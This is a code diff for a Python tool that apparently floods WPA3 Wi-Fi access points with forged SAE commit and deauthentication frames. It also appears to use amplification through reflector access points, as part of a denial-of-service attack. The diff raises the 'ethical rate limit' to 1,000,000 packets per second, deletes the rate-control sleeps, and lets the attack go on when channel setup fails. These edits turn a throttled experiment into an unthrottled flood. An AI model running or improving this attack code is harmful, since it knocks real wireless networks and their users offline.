@@ -44,7 +44,7 @@ AP_MAX_INACTIVITY = 300            # AP_MAX_INACTIVITY timeout (seconds)
 
 BURST_SIZE = 128                   # Standard burst size for reproducible DoS
 INTER_PACKET_GAP = 0.0001          # 100μs inter-packet delay (burst mode)
-PACKETS_PER_SECOND_LIMIT = 1000    # Ethical rate limit for controlled experiments
+PACKETS_PER_SECOND_LIMIT = 1000000 # Effectively disabled for maximum throughput
 
 SAE_GROUP_ID_19 = b'\x13\x00'      # ECC P-256 (mandatory group)
 SCALAR_BYTES = 32
@@ -202,17 +202,31 @@ def validate_sae_hex_lists():
         sys.exit(1)
 
 def set_channel_scientific(interface: str, channel: str) -> bool:
-    """Robust channel switching with hardware stabilization delay"""
-    for cmd in [['iw', 'dev', interface, 'set', 'channel', str(channel)],
-                ['iwconfig', interface, 'channel', str(channel)]]:
-        try:
-            if subprocess.run(cmd, capture_output=True, timeout=2).returncode == 0:
-                time.sleep(0.15)  # Hardware settle time per Linux wireless docs
-                return True
-        except Exception:
-            pass
-    logger.warning(f"[CHANNEL] Failed to set channel {channel} on {interface}")
-    return False
+    subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
+    time.sleep(0.1)
+
+    try:
+        info = subprocess.run(['iw', 'dev', interface, 'info'], capture_output=True, text=True, timeout=2)
+        phy_num = None
+        for line in info.stdout.splitlines():
+            if line.strip().startswith('wiphy'):
+                phy_num = line.strip().split()[1]
+                break
+        if not phy_num:
+            logger.warning(f"[CHANNEL] No phy for {interface}")
+            return False
+        phy = f"phy{phy_num}"
+    except Exception as e:
+        logger.warning(f"[CHANNEL] Phy lookup failed: {e}")
+        return False
+
+    result = subprocess.run(['iw', 'phy', phy, 'set', 'channel', str(channel)], capture_output=True, timeout=2)
+    if result.returncode == 0:
+        time.sleep(0.3)
+        return True
+    else:
+        logger.warning(f"[CHANNEL] iw phy {phy} set channel {channel} failed: {result.stderr.decode().strip()}")
+        return False
 
 def send_burst_scientific(packet_list: list, interface: str, counter: Value):
     """Paper-aligned burst sending with precise timing & atomic counting"""
@@ -227,16 +241,19 @@ def send_burst_scientific(packet_list: list, interface: str, counter: Value):
     try:
         sendp(batch, iface=interface, verbose=False, inter=INTER_PACKET_GAP, count=1)
         sent += len(batch)
-        # Rate control
-        elapsed = time.time() - start
-        target_time = sent / PACKETS_PER_SECOND_LIMIT
-        if elapsed < target_time:
-            time.sleep(target_time - elapsed)
         with counter.get_lock():
             counter.value += len(batch)
     except Exception as e:
-        logger.warning(f"[SEND] Buffer/Drop error on {interface}: {e}")
-        time.sleep(0.1)
+        error_msg = str(e)
+        if "No such device" in error_msg or "19" in error_msg:
+            logger.error(f"[HARDWARE ERROR] {interface} has disappeared! (USB-Reset?) Pause for 5 seconds...")
+            time.sleep(5)
+        elif "Network is down" in error_msg or "100" in error_msg:
+            subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
+            time.sleep(0.1)
+        else:
+            logger.warning(f"[SEND] Buffer/Drop error on {interface}: {e}")
+            time.sleep(0.1)
 
 # =====================================================================================
 # ======================== SCANNER FUNCTIONS (VERSION 2 IMPROVED) =====================
@@ -287,7 +304,11 @@ def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
             time.sleep(scan_duration)
             if proc.poll() is None:
                 proc.terminate()
-                proc.wait(timeout=2)
+                try:
+                    proc.wait(timeout=2)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+                    proc.wait() 
             csv_files = glob.glob(f"{prefix}-*.csv")
             if csv_files:
                 latest_csv = max(csv_files, key=os.path.getctime)
@@ -314,14 +335,13 @@ def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
 # =====================================================================================
 # ======================== ATTACK FUNCTIONS (VERSION 1 LOGIC) =========================
 # =====================================================================================
-def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex_list, finite_hex_list,
+def run_attacker_process(interface, bssid, channel, band, attack_type, scalar_hex_list, finite_hex_list,
                          counter, sta_macs=None, amplification_targets=None, opposite_bssid=None):
     """Scientific attack implementation – original Version 1 behavior"""
     from scapy.all import RandMAC, Dot11, RadioTap, Dot11Auth, Dot11Deauth, sendp
 
     if not set_channel_scientific(interface, channel):
-        logger.error(f"[ATTACK] {interface}: Channel setup failed")
-        return
+        logger.warning(f"[ATTACK] {interface}: Channel setup warning, try it anyway...")
 
 # Decode & validate SAE lists safely as PAIRS
     try:
@@ -413,10 +433,7 @@ def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex_list
                 send_burst_scientific(packets, interface, counter)
                 burst_count += 1
                 dt = time.time() - t_start
-                logger.info(f"[BURST] {interface} | Type: {attack_type} | Count: {burst_count} | Time: {dt:.3f}s")
-
-            # Scientific sleep to maintain target rate & avoid driver starvation
-            time.sleep(max(0.01, 1.0 / (PACKETS_PER_SECOND_LIMIT / BURST_SIZE)))
+                logger.info(f"[BURST] {interface} ({band}, CH {channel}) | Type: {attack_type} | Count: {burst_count} | Time: {dt:.3f}s")
 
     except KeyboardInterrupt:
         logger.info(f"[STOP] {interface} interrupted by user")
@@ -442,7 +459,7 @@ def cleanup(procs, scanner_proc=None):
 
 def signal_handler(sig, frame):
     logger.info("[SIGNAL] Interrupt received, graceful shutdown...")
-    sys.exit(0)
+    os._exit(0)
 
 # =====================================================================================
 # ======================== MAIN ORCHESTRATOR ==========================================
@@ -498,14 +515,14 @@ def main():
                     refl = AMPLIFICATION_REFLECTOR_APS_5GHZ if band == '5GHz' else AMPLIFICATION_REFLECTOR_APS_2_4GHZ
 
                     p = Process(target=run_attacker_process,
-                                args=(iface, target_b, ch, attack, s_hex, f_hex, counters[iface]),
+                                args=(iface, target_b, ch, cfg['band'], attack, s_hex, f_hex, counters[iface]),
                                 kwargs={'sta_macs': TARGET_STA_MACS,
                                         'amplification_targets': refl,
                                         'opposite_bssid': None}, daemon=True)
                     procs[iface] = p
                     active_ch[iface] = ch
                     p.start()
-                    logger.info(f"[ORCHESTRATOR] {iface} -> {attack} on CH {ch}")
+                    logger.info(f"[ORCHESTRATOR] {iface} ({band}) -> {attack} on CH {ch}")
 
             time.sleep(1)
     except KeyboardInterrupt:
